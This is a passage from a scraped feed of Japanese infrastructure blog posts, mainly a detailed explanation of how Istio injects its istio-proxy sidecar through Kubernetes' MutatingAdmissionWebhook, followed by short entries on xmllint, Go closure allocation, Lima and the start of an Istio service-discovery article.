(※逆向きの矢印)ここで説明するフロー箇所(7) patch処理を定義(8) AdmissionResponseに値を詰める(9) AdmissionReviewを返信kube-apiserver ➡︎ etcdここで説明するフロー箇所(10) patch処理をコール(11) マニフェストを永続化クライアント ⬅︎ kube-apiserverここで説明するフロー箇所(12) コール完了を返信以降の仕組み05. おわりに記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4Fさて、前回の記事の時と同様に、最近の業務でもオンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、サービスメッシュを実装するIstioサイドカーインジェクションを記事で解説しました。解説するのは、執筆時点 (2023/01/14) 時点で最新の 1.14 系のIstioです。執筆時点 (2023/01/14) では、Istioが実装するサービメッシュには、『サイドカープロキシメッシュ』と『アンビエントメッシュ』があります。サイドカープロキシメッシュの仕組みの軸になっているものは、サイドカーコンテナであるistio-proxyコンテナです。Istioは、KubernetesのPodの作成時に、istio-proxyコンテナをPod内に自動的にインジェクション (注入) しますそれでは、もりもり布教していきます\uD83D\uDE1702. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかそもそも、なぜサービスメッシュが登場したのでしょうか。マイクロサービスアーキテクチャのシステムには、アーキテクチャ固有のインフラ領域の問題 (例：サービスディスカバリーの必要性、マイクロサービス間通信の暗号化、テレメトリー作成、など) があります。アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装すれば、これらの問題の解決できます。しかし、アプリエンジニアはアプリ領域の問題に責務を持ち、インフラ領域の問題はインフラエンジニアで解決するようにした方が、互いに効率的に開発できます。そこで、インフラ領域の問題を解決するロジックをサイドカーとして切り分けます。これにより、アプリエンジニアとインフラエンジニアの責務を分離可能になり、凝集度が高くなります。また、インフラ領域の共通ロジックをサイドカーとして各マイクロサービスに提供できるため、単純性が高まります。こういった流れの中で、サービスメッシュが登場しました。servicemesh.es | Service Mesh ComparisonWhat is Service Mesh and why is it needed in Kubernetes?サイドカープロキシメッシュIstioのサイドカーによるサービスメッシュ (サイドカープロキシメッシュ) は、サイドカーコンテナ (istio-proxyコンテナ) が稼働するデータプレーンサイドカーを中央集権的に管理するIstiod (discoveryコンテナ) が稼働するコントロールプレーンからなります。Istio / Architecture03. admission-controllersアドオンについてadmission-controllersアドオンとはIstioのPod内へのサイドカーインジェクションの前提知識として、admission-controllersアドオンを理解する必要があります。もし、admission-controllersアドオンをご存知の方は、 04. サイドカーインジェクションの仕組み まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍kube-apiserverでは、admission-controllersアドオンを有効化できます。有効化すると、認証ステップと認可ステップの後にmutating-admissionステップとvalidating-admissionステップを実行でき、admissionプラグインの種類に応じた処理を挿入できます。クライアント (kubectlクライアント、Kubernetesリソース) からのリクエスト (例：Kubernetesリソースに対する作成/更新/削除、kube-apiserverからのプロキシへの転送) 時に、各ステップでadmissionプラグインによる処理 (例：アドオンビルトイン処理、独自処理) を発火させられます。Admission Controllers Reference | KubernetesKubernetes Best Practices: Blueprints for Building Successful Applications on Kubernetesadmissionプラグインの種類admission-controllersアドオンのadmissionプラグインには、たくさんの種類があります。IstioがPod内にサイドカーをインジェクションする時に使用しているアドオンは、『MutatingAdmissionWebhook』です。CertificateApprovalCertificateSigningCertificateSubjectRestrictionDefaultIngressClassDefaultStorageClassDefaultTolerationSecondsLimitRanger\\"MutatingAdmissionWebhook\\" \uD83D\uDC48 これNamespaceLifecyclePersistentVolumeClaimResizePodSecurityPriorityResourceQuotaRuntimeClassServiceAccountStorageObjectInUseProtectionTaintNodesByConditionValidatingAdmissionWebhookAdmission Controllers Reference | KubernetesMutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはMutatingAdmissionWebhookプラグインを使用すると、mutating-admissionステップ時に、リクエスト内容を変更する処理をフックできます。フックする具体的な処理として、webhookサーバーにAdmissionRequestリクエストとして送信することにより、レスポンスのAdmissionResponseに応じてリクエスト内容を動的に変更します。MutatingWebhookConfigurationで、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を設定します。MutatingWebhookConfigurationの具体的な実装については、サイドカーインジェクションの仕組みの中で説明していきます。Diving into Kubernetes MutatingAdmissionWebhook | by Morven Cao | IBM Cloud | MediumKubernetes Admission Webhook覚書き - gashirar\'s blogAdmission Webhookを作って遊んで、その仕組みを理解しよう（説明編）AdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReviewAdmissionReviewは以下のようなJSONであり、kube-apiserverとwebhookサーバーの間でAdmissionRequestとAdmissionResponseを運びます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {},  # AdmissionResponse  \\"response\\": {},}v1 package - k8s.io/api/admission/v1 - Go Packages▼ AdmissionRequestAdmissionRequestは以下のようなJSONです。kube-apiserverがクライアントから受信した操作内容が持つことがわかります。例で挙げたAdmissionRequestでは、クライアントがDeploymentをCREATE操作するリクエストをkube-apiserverに送信したことがわかります。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"apps\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"deployments\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}Dynamic Admission Control | Kubernetes▼ AdmissionResponse一方でAdmissionResponseは、例えば以下のようなJSONです。AdmissionResponseは、マニフェスト変更処理をpatchキーの値に持ち、これはbase64方式でエンコードされています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"<value from request.uid>\\",      # 宛先のwebhookサーバーが受信したか否かを表す。      \\"allowed\\": true,      # PathによるPatch処理を行う。      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"W3sib3AiOiAiYWRkIiwgInBhdGgiOiAiL3NwZWMvcmVwbGljYXMiLCAidmFsdWUiOiAzfV0=\\",    },}エンコード値をデコードしてみると、例えば以下のようなpatch処理が定義されています。# patchキーをbase64方式でデコードした場合[{\\"op\\": \\"add\\", \\"path\\": \\"/spec/replicas\\", \\"value\\": 3}]マニフェストに対する操作 (op) 、キー (path) 、値 (value) が設定されています。kube-apiserverがこれを受信すると、指定されたキー (.spec.replicas) に値 (3) に追加します。Dynamic Admission Control | Kubernetes04. サイドカーインジェクションの仕組み全体のフロー前提知識を踏まえた上で、admission-controllersアドオンの仕組みの中で、サイドカーのistio-proxyコンテナがどのようにPodにインジェクションされるのかを見ていきましょう。最初に、サイドカーインジェクションのフローは以下の通りになっています。(画像はタブ開き閲覧を推奨)Istio in Action (English Edition)クライアント ➡︎ kube-apiserverここで説明するフロー箇所『クライアント ➡︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(1) Podの作成をリクエストまずは、クライアントがkube-apiserverにリクエストを送信するところです。クライアント (Deployment、DaemonSet、StatefulSet、を含む) は、Podの作成リクエストをkube-apiserverに送信します。この時のリクエスト内容は、以下の通りとします。# Podを作成する。$ kubectl apply -f foo-pod.yaml# foo-pod.yamlファイルapiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80またNamespaceでは、あらかじめistio-proxyコンテナのインジェクションが有効化されているとします。Istioではv1.10以降、リビジョンの番号のエイリアスを使用して、istio-proxyコンテナのインジェクションを有効化するようになりました。apiVersion: v1kind: Namespacemetadata:  name: foo-namespace  labels:    # istio-proxyコンテナのインジェクションを有効化する。    # エイリアスは自由    istio.io/rev: <エイリアス>Istio / Announcing Support for 1.8 to 1.10 Direct Upgrades▶ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dkube-apiserver ➡︎ Serviceここで説明するフロー箇所『kube-apiserver ➡︎ Service』の箇所を説明します。(画像はタブ開き閲覧を推奨)(2) 認証/認可処理をコールkube-apiserverは、認証ステップと認可ステップにて、クライアントからのリクエストを許可します。(3) アドオンの処理をコールkube-apiserverは、mutating-admissionステップにて、MutatingAdmissionWebhookプラグインの処理をコールします。前提知識の部分で具体的な実装を省略しましたが、Istioのバージョン1.14.3時点で、MutatingWebhookConfigurationは以下のようになっています。Namespaceでサイドカーインジェクションを有効化する時に使用したエイリアスは、このMutatingWebhookConfigurationで実体のリビジョン番号と紐づいています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yamlapiVersion: admissionregistration.k8s.io/v1beta1kind: MutatingWebhookConfigurationmetadata:  name: istio-revision-tag-default  labels:    app: sidecar-injector    # エイリアスの実体    istio.io/rev: <リビジョン番号>    # リビジョン番号のエイリアス    istio.io/tag: <エイリアス>webhooks:  - name: rev.namespace.sidecar-injector.istio.io    # MutatingAdmissionWebhookプラグインの処理の発火条件を登録する。    rules:      - apiGroups: [\\"\\"]        apiVersions: [\\"v1\\"]        operations: [\\"CREATE\\"]        resources: [\\"pods\\"]        scope: \\"*\\"    # Webhookの前段にあるServiceの情報を登録する。    clientConfig:      service:        name: istiod-<リビジョン番号>        namespace: istio-system        path: \\"/inject\\" # エンドポイント        port: 443      caBundle: Ci0tLS0tQk ...    # Namespace単位のサイドカーインジェクション    # 特定のNamespaceでMutatingAdmissionWebhookプラグインの処理を発火させる。    namespaceSelector:      matchExpressions:        - key: istio.io/rev          operator: DoesNotExist        - key: istio-injection          operator: DoesNotExist    # Pod単位のサイドカーインジェクション    # 特定のオブジェクトでMutatingAdmissionWebhookプラグインの処理を発火させる。    objectSelector:      matchExpressions:        - key: sidecar.istio.io/inject          operator: NotIn          values:            - \\"false\\"        - key: istio.io/rev          operator: In          values:            - <エイリアス>    ...MutatingWebhookConfigurationには、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を定義します。MutatingAdmissionWebhookプラグインの発火条件に関して、例えばIstioでは、 NamespaceやPod.metadata.labelsキーに応じてサイドカーインジェクションの有効化/無効化を切り替えることができ、これをMutatingAdmissionWebhookプラグインで制御しています。webhookサーバーの宛先情報に関して、Istioではwebhookサーバーの前段にServiceを配置しています。MutatingAdmissionWebhookプラグインが発火した場合、Serviceの/inject:443にHTTPSプロトコルのリクエストを送信するようになっています。また、宛先のServiceの名前がistiod-<リビジョン番号>となっていることからもわかるように、Serviceは特定のバージョンのIstiodコントロールプレーンに対応しており、想定外のバージョンのIstiodコントロールプレーンを指定しないように制御しています。一方で発火しなかった場合には、以降のAdmissionReviewの処理には進みません。(4) AdmissionRequestに値を詰めるkube-apiserverは、mutating-admissionステップにて、クライアントからのリクエスト内容 (Podの作成リクエスト) をAdmissionReveiew構造体のAdmissionRequestに詰めます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"core\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"pods\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}(5) AdmissionReviewを送信kube-apiserverは、mutating-admissionステップにて、Serviceの/inject:443にAdmissionReview構造体を送信します。Service ➡︎ webhookサーバーここで説明するフロー箇所『Service ➡︎ webhookサーバー』の箇所を説明します。(画像はタブ開き閲覧を推奨)(6) 15017番ポートにポートフォワーディングServiceは、/inject:443でリクエストを受信し、discoveryコンテナの15017番ポートにポートフォワーディングします。Istioのバージョン1.14.3時点で、Serviceは以下のようになっています。$ kubectl get svc istiod-service -n istio-system -o yamlapiVersion: v1kind: Servicemetadata:  labels:    app: istiod  name: istiod-<リビジョン番号>  namespace: istio-systemspec:  type: ClusterIP  selector:    app: istiod    istio.io/rev: <リビジョン番号>  ports:    - name: grpc-xds      port: 15010      protocol: TCP      targetPort: 15010    - name: https-dns      port: 15012      protocol: TCP      targetPort: 15012    # webhookサーバーにポートフォワーディングする。    - name: https-webhook      port: 443      protocol: TCP      targetPort: 15017    - name: http-monitoring      port: 15014      protocol: TCP      targetPort: 15014.spec.selector.istio.io/revキーに、ポートフォワーディング先のPodを指定するためのリビジョン番号が設定されており、このPodはdiscoveryコンテナを持ちます。Istioは、discoveryコンテナ内でwebhookサーバーを実行し、15017番ポートでリクエストを待ち受けます。▶ istio.io/rev`discovery`コンテナの待ち受けポートについてdiscoveryコンテナがリクエストを待ち受けているポート番号を見てみると、15017番ポートでリッスンしていることを確認できます\uD83D\uDC4D$ kubectl exec foo-istiod -n istio-system -- netstat -tulpnActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 127.0.0.1:9876          0.0.0.0:*               LISTEN      1/pilot-discoverytcp6       0      0 :::15017                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::8080                 :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15010                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15012                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15014                :::*                    LISTEN      1/pilot-discovery> - istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHub> - Istio / Application Requirementskube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所『kube-apiserver ⬅︎ Service ⬅︎ webhookサーバー』の箇所を説明します。矢印が逆向きなことに注意してください。(画像はタブ開き閲覧を推奨)(7) patch処理を定義仕組みの中でも、ここは重要な部分です。discoveryコンテナ内のwebhookサーバーは、リクエスト内容を書き換えるためのpatch処理を定義します。webhookサーバーは、マニフェストの.spec.containers[1]パスにistio-proxyキーを追加させるようなpatch処理を定義します。この定義によって、結果的にサイドカーのインジェクションが起こるということになります。[  ...  {    \\"op\\": \\"add\\",    # .spec.initContainers[1] を指定する。    \\"path\\": \\"/spec/initContainers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-init\\",      \\"resources\\": {                     ...      }    }  },  {    \\"op\\": \\"add\\",    # .spec.containers[1] を指定する。    \\"path\\": \\"/spec/containers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-proxy\\",      \\"resources\\": {                     ...      }    }  }  ...]istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubistio/pkg/kube/inject/webhook_test.go at 1.14.3 \xb7 istio/istio \xb7 GitHubこの時、サイドカーのテンプレートに割り当てられた値が、patch処理を内容を決めます。type SidecarTemplateData struct {    TypeMeta             metav1.TypeMeta    DeploymentMeta       metav1.ObjectMeta    ObjectMeta           metav1.ObjectMeta    Spec                 corev1.PodSpec    ProxyConfig          *meshconfig.ProxyConfig    MeshConfig           *meshconfig.MeshConfig    Values               map[string]interface{}    Revision             string    EstimatedConcurrency int    ProxyImage           string}...istio/pkg/kube/inject/inject.go at 1.14.3 \xb7 istio/istio \xb7 GitHub▶ patch処理でインジェクションするコンテナについてサイドカーコンテナのistio-proxyコンテナの他に、InitContainerのistio-initコンテナもインジェクション可能にします。このistio-initコンテナは、istio-proxyコンテナを持つPodです。インバウンド/アウトバウンド通信の経路を制御するために、Pod内にiptablesのルールを適用する責務を担っています\uD83D\uDCAA\uD83C\uDFFBIstio Sidecar\'s interception mechanism for traffic - SoByte(8) AdmissionResponseに値を詰めるdiscoveryコンテナ内のwebhookサーバーは、patch処理の定義をAdmissionReveiew構造体のAdmissionResponseに詰めます。patchキーの値に、先ほどのpatch処理の定義をbase64方式でエンコードした文字列が割り当てられています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"*****\\",      \\"allowed\\": true,      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"<先ほどのpatch処理の定義をbase64方式でエンコードした文字列>\\",    },}istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHub(9) AdmissionReviewを返信discoveryコンテナ内のwebhookサーバーは、AdmissionReview構造体をレスポンスとしてkube-apiserverに返信します。kube-apiserver ➡︎ etcdここで説明するフロー箇所『kube-apiserver ➡︎ etcd』の箇所を説明します。(画像はタブ開き閲覧を推奨)(10) patch処理をコールkube-apiserverは、AdmissionReview構造体を受信し、AdmissionResponseに応じてリクエスト内容を書き換えます。patch処理の定義をAdmissionReview構造体から取り出し、クライアントからのリクエスト内容を書き換えます。具体的には、istio-proxyコンテナとistio-initコンテナを作成するために、リクエストしたマニフェストの該当箇所にキーを追加します。apiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80    # kube-apiserverが追加    - name: istio-proxy      ...  # kube-apiserverが追加  initContainers:    - name: istio-init    ...(11) マニフェストを永続化kube-apiserverは、etcdにPodのマニフェストを永続化します。クライアント ⬅︎ kube-apiserverここで説明するフロー箇所『クライアント ⬅︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(12) コール完了を返信kube-apiserverは、クライアントにレスポンスを受信します。$ kubectl apply -f foo-pod.yaml# kube-apiserverからレスポンスが返ってくるpod \\"foo-pod\\" created以降の仕組み(画像はタブ開き閲覧を推奨)kube-apiserverは、他のNodeコンポーネント (kube-controlleretcd、kube-scheduler、kubelet、など) と通信し、Podを作成します。このPodのマニフェストは、アプリコンテナの他に、istio-proxyコンテナとistio-initコンテナを持ちます。結果として、サイドカーコンテナのistio-proxyコンテナをインジェクションしたことになります。▶ kube-apiserverと他コンポーネントの通信についてコンポーネントの通信については、以下の記事が非常に参考になりました\uD83D\uDE47\uD83C\uDFFB‍Kubernetes Master Components: Etcd, API Server, Controller Manager, and Scheduler | by Jorge Acetozi | jorgeacetozi | Medium05. おわりにサービスメッシュの登場とIstioのサイドカーインジェクションの仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。今回登場したMutatingAdmissionWebhookプラグインに関して、私の関わっているプロダクトではIstio以外 (例：CertManager、Prometheus、AWSのaws-eks-vpc-cniアドオン、など) でも使用しています✌️そのため、MutatingAdmissionWebhookプラグインをどのように使っているのかを一度知れば、知識の汎用性が高いと考えています。サイドカーインジェクションはIstioでも基本的な機能であり、もし未体験の方がいらっしゃれば、お手元でサイドカーコンテナが追加されることを確認していただくとよいかもしれません\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/01/14/223815","isoDate":"2023-01-14T13:38:15.000Z","dateMiliSeconds":1673703495000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"xmllint で HTML 内の任意の値を取り出す","contentSnippet":"サクッと shell script で HTML の中の何かを取り出したい時があります。 そんな時に使えるのが xmllint. しっかりやるなら python の Beautiful Soup を使ったりしますが、本当に簡単なことを簡単にやりたい場合に xmllint","link":"https://blog.1q77.com/2023/01/xmllint-html-xpath/","isoDate":"2023-01-12T14:40:51.000Z","dateMiliSeconds":1673534451000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"MongoDB Atlas の紹介","contentSnippet":"MongoDB Atlas とは MongoDB Atlas (以下 Atlas という)は、MongoDB Inc.によって作られた MongoDB の DBaaS(DB as a Service) です。 Atlas […]The post MongoDB Atlas の紹介 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/mongodb-atlas/","isoDate":"2023-01-11T23:57:02.000Z","dateMiliSeconds":1673481422000,"authorName":"Sreake","authorId":"Sreake"},{"title":"CodeDeploy Agent のバージョンアップを自動化する","contentSnippet":"概要 Auto Scaling Group 内のインスタンスで CodeDeploy を使用する場合、Agent のバージョンアップが手間なので AMI にインストールしない方がよいです。 Systems Manager […]The post CodeDeploy Agent のバージョンアップを自動化する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codedeploy-agent-update/","isoDate":"2023-01-10T01:22:39.000Z","dateMiliSeconds":1673313759000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Lima の vmType VZ と virtiofs を試す","contentSnippet":"Lima が version 0.14.0 で QEMU だけではなく macOS の Virtualization.Framework に対応していました。 vmtype という設定項目が増えています。 この新しい Framework では Host のディレクトリをマウントするのに virtiofs が使えるようになっており、","link":"https://blog.1q77.com/2022/12/lima-vz/","isoDate":"2022-12-29T15:49:47.000Z","dateMiliSeconds":1672328987000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"クロージャーのメモリ割り当てについて(Go言語)","contentSnippet":"A Tour of GoでGo言語に入門していて、クロージャーのメモリ割り当てについて疑問に思ったので調べた。クロージャーとはA Tour of Go での説明をまとめると、本体の外部から変数を参照する関数値関数は、参照した変数にアクセスして割り当てることができるという特徴がある。サンプルコードpackage mainimport \\"fmt\\"func adder() func() int {    sum := 0    return func() int {        sum++        return sum    }}func main() {    f := adder()    for i := 0; i < 10; i++ {        fmt.Println(f())    }}出力12345678910adder 関数はクロージャーを返し、各クロージャーは、sum 変数にバインドされている。疑問点サンプルコードではクロージャーが、adder関数で定義されたsum変数を参照、割り当てしてる。しかし、関数呼び出しといえばスタックフレームを用いるイメージしかない私にとっては、sum変数の参照がどこに残っているのか疑問。おそらくヒープ領域に割り当てられてる？GitHub issue でのやり取り調べたところ、同じ疑問に答えているissueを見つけた。質問者は、同じような処理をクロージャーを使用する場合と使用しない場合で試している。そして、クロージャーを使用した場合だとヒープ領域への割り当てが行われると言っている。実際のコードpackage mainimport (    \\"fmt\\"    \\"sync\\"    \\"testing\\")type Object struct {}var p sync.Pool = sync.Pool{    New: func() interface{} {        return &Object{}    },}type Func struct {    ctx interface{}}func (this *Func) Run() {    p.Put(this.ctx)  }func RunWithFunc() Func {    ctx := p.Get()    return Func{ctx: ctx}}func RunWithClosure() func() {    ctx := p.Get()    return func() { p.Put(ctx) }}func Test1() {    cleanup := RunWithFunc()    cleanup.Run()}func Test2() {    cleanup := RunWithClosure()    cleanup()}func main() {    f1 := testing.AllocsPerRun(1000, Test1)    f2 := testing.AllocsPerRun(1000, Test2)    // 0    fmt.Println(f1)    // 1    fmt.Println(f2)}コードの詳しい内容は、クロージャーを使わないRunWithFuncと使用するRunWithClosureを実行する。どちらも大雑把に言うと、空の構造体をsync.Poolから取り出したり戻したりする。クロージャーを使うとヒープ領域への割り当てが行われることをtesting.AllocsPerRunが示す。といった感じ。回答者は以下のように言っている。問題は、RunWithClosure がクロージャーを返す必要があることです。関数が実行される前にスタック フレームがなくなるため、スタックに割り当てることができません。 可能な場合は、スタックにクロージャーを割り当てます。スタック上にクロージャ（これらの2つのフィールドの匿名構造体）を割り当て、呼び出された関数にそれらへのポインタを渡すことができますし、実際に行っています。ここでの問題は、その構造体がRunWithClosureの内部で割り当てられ、RunWithClosureのフレームは、cleanupを呼び出すまでになくなってしまうことです。そのため、RunWithClosureのフレームでクロージャを割り当てることはできません。それは、ヒープ上に割り当てられなければなりません。もし、RunWithClosureをその呼び出し元にインライン化すれば、そのスタック・フレームが十分に長く生きるので、呼び出し元でクロージャを割り当てることができるようになります。クロージャーが実行される前に、参照先をもつスタックフレームがなくなってしまう場合、それをヒープ領域に割り当てるらしい。またそれを避けたい場合は、関数になっている部分をインライン化するといいらしい。まとめGo言語に入門していて、クロージャーが参照している変数がどこに残っているか疑問に思ったが、GitHub issueのやり取りから、予想した通り、ヒープ領域への割り当てが行われていることがわかった。","link":"https://kechigon.hatenablog.com/entry/2022/12/29/203946","isoDate":"2022-12-29T11:39:46.000Z","dateMiliSeconds":1672313986000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"rbspy で ruby の stacktrace を flamegraph にする","contentSnippet":"中身をよく知らない Rails アプリでどこが遅いのかな？と思って rbspy ( github) を試してみたのでメモ。 とりあえず使って flamegraph を書き出してみたんだけどそもそも flamegraph がどういうものなのか分かっ","link":"https://blog.1q77.com/2022/12/rbspy/","isoDate":"2022-12-28T11:26:10.000Z","dateMiliSeconds":1672226770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Professional Cloud Security Engineer の振り返り","contentSnippet":"はじめに2022/12/28 に Google Cloud Certification の１つである、Professional Cloud Security Engineer に合格したので、そち…","link":"https://qiita.com/dirtymosschan/items/2c66eec7919220a4ec06","isoDate":"2022-12-28T08:57:17.000Z","dateMiliSeconds":1672217837000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"go.mod の更新","contentSnippet":"たまに使い捨ての code を書いて放置する程度だと毎回ググってしまうのでメモ。 go.mod の更新は go get や go mod tidy で行うことができる。 go の version を更新 # go.mod 内の go の version は次のようにして go mod tidy","link":"https://blog.1q77.com/2022/12/updage-go-mod/","isoDate":"2022-12-27T03:52:31.000Z","dateMiliSeconds":1672113151000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"【Istio⛵️】Istioのサービス間通信を実現するサービスディスカバリーの仕組み","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️サービスディスカバリーの種類についてIstioのサービス間通信を実現するサービスディスカバリーの仕組みについて記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとはなぜサービスディスカバリーが必要なのかサービスディスカバリーの要素サービスディスカバリーのパターンサービスディスカバリーのパターンとはサーバーサイドパターンクライアントサイドパターン03. Istioのサービスディスカバリーの仕組み全体像(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるロードバランシングdiscoveryコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるリクエスト受信04. istio-proxyコンテナ内のEnvoyの仕組み全体像(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるエンドポイント選択(6) 宛先マイクロサービスへのリクエスト送信EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイントリスナー▼ 確認方法▼ 結果ルート▼ 確認方法▼ 結果クラスター▼ 確認方法▼ 結果エンドポイント▼ 確認方法▼ 結果Envoyの処理の流れのまとめ(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるクラスター選択(6) 宛先マイクロサービスへのリクエスト送信05. おわりに謝辞記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F3-shake Advent Calender 2022 最終日の記事です\uD83C\uDF85普段、私は 俺の技術ノート に知見を記録しており、はてなブログはデビュー戦となります。最近の業務で、オンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、Istioのサービス間通信を実現するサービスディスカバリーの仕組みを記事で解説しました。Istioの機能の1つであるサービスディスカバリーは、その仕組みの多くをEnvoyに頼っているため、合わせてEnvoyの仕組みも説明します。それでは、もりもり布教していきます\uD83D\uDE1702. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとは平易な言葉で言い換えると サービス間通信 です。マイクロサービスアーキテクチャでは、マイクロサービスからマイクロサービスにリクエストを送信する場面があります。サービスディスカバリーとは、宛先マイクロサービスの宛先情報 (例：IPアドレス、完全修飾ドメイン名、など) を検出し、送信元マイクロサービスが宛先マイクロサービスにリクエストを継続的に送信可能にする仕組みのことです。なぜサービスディスカバリーが必要なのかそもそも、なぜサービスディスカバリーが必要なのでしょうか。マイクロサービスアーキテクチャでは、システムの信頼性 (定められた条件下で定められた期間にわたり、障害を発生させることなく実行する程度) を担保するために、マイクロサービスのインスタンスの自動スケーリングを採用します。この時、自動スケーリングのスケールアウトでマイクロサービスが増加するたびに、各インスタンスには新しい宛先情報が割り当てられてしまいます。また、マイクロサービスが作り直された場合にも、宛先情報は更新されてしまいます。このように、たとえインスタンスの宛先情報が更新されたとしても、インスタンスへのリクエストに失敗しない仕組みが必要です。サービスディスカバリーの要素サービスディスカバリーの仕組みは、次の要素からなります。名前解決は、DNSベースのサービスディスカバリー (例：CoreDNS + Service + kube-proxyによるサービスディスカバリー) で必要となり、Istioでは使いません。そのため、本記事では言及しないこととします\uD83D\uDE47\uD83C\uDFFB‍ 要素                    責務                                                              送信元マイクロサービス  リクエストを送信する。                                            宛先マイクロサービス    リクエストを受信する。                                            サービスレジストリ      宛先マイクロサービスの宛先情報を保管する。                        ロードバランサー        宛先マイクロサービスのインスタンスにロードバランシングする。      名前解決                宛先マイクロサービスへのリクエスト送信時に、名前解決可能にする。 